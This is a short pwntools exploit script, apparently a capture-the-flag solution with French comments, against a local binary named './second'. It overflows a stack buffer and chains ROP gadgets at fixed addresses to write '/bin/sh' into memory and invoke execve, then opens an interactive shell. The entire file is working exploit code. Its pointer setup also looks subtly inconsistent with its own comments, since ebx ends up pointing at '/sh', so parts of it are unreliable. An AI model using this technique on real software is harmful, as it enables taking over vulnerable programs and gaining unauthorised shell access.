#!/usr/bin/python2
from pwn import *
r = process('./second')

addr_pop_eax_edx_ebx = 0x08058118
addr_xor_ecx_int = 0x0804a69f
addr_mov_ptr_eax_edx = 0x08057606
addr_data = 0x080e2060

payload = "A"*(16 + 12) #taille du buffer + offset

#ecrire /bin dans .data+4
payload += p32(addr_pop_eax_edx_ebx) #premier ret
payload += p32(addr_data) #eax
payload += "/bin"    #edx
payload += p32(0)    #ebx
payload += p32(addr_mov_ptr_eax_edx)

#ecrire /sh\x00 dans .data+8
payload += p32(addr_pop_eax_edx_ebx) #deuxieme ret
payload += p32(addr_data+4) #eax
payload += "/sh\x00"    #edx
payload += p32(0)    #ebx
payload += p32(addr_mov_ptr_eax_edx)

#vider les registres pour le execve
payload += p32(addr_pop_eax_edx_ebx) #deuxieme ret
payload += p32(11) #eax
payload += p32(0)    #edx
payload += p32(addr_data+4)    #ebx

payload += p32(addr_xor_ecx_int)

print(r.recvrepeat(0.2))
r.sendline(payload)
r.interactive()
